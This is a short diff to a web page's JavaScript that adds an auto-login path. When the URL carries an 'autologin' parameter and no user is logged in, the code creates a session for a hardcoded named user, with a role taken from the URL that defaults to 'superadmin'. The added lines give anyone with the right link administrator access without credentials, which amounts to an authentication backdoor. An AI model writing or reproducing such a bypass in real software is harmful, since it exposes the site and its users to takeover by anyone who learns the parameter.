@@ -4477,6 +4477,17 @@ window.addEventListener('DOMContentLoaded', () => {
         }
     }
 
+    const urlParams = new URLSearchParams(window.location.search);
+    if (!activeUser && urlParams.get('autologin')) {
+        const roleParam = urlParams.get('role') || 'superadmin';
+        activeUser = {
+            username: 'rezatri',
+            name: 'Reza Tri Wardana',
+            role: roleParam,
+            title: roleParam === 'superadmin' ? 'Super Administrator' : (roleParam === 'guest' ? 'User' : 'Administrator')
+        };
+    }
+
     if (activeUser) {
         // User telah login sebelumnya: pulihkan sesi akun aktif tanpa reset ke tamu/user
         loginSuccess(activeUser, true);
